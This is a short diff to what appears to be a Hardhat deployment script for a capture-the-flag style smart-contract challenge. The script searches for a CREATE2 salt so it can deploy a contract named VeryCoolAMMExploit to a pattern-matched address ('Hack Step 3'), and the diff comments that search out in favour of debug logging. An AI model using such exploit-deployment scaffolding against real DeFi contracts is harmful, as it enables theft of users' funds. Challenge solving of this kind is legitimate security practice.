@@ -41,15 +41,20 @@ async function main() {
     const VeryCoolAMMExploitBytecode = VeryCoolAMMExploitFactory.bytecode;
 
     const signer = (await ethers.getSigners())[0];
-    const [salt, address] = findSaltToMatch(
+
+    console.log(VeryCoolAMMExploitBytecode.toString());
+    //console.log(Array.from(Buffer.from(signer.address.slice(2), "hex")).toString());
+    console.log(signer.address);
+    /*const [salt, address] = findSaltToMatch(
         signer.address,
         VeryCoolAMMExploitBytecode,
         "00000000",
-        "0x785699",
+        "0x0000000000000000000000000000000000000000000000000000000210573b07",
+        //"0x01559739",
         PatternFlags.FromStart,
-    );
+    );*/
 
-    console.log(`Salt: ${salt}, Address:${address}`);
+    //console.log(`Salt: ${salt}, Address:${address}`);
 
     // Hack Step 3: Deploy Exploit using Salt
     /*const VeryCoolAMMExploit: VeryCoolAMMExploit = (await deploy(
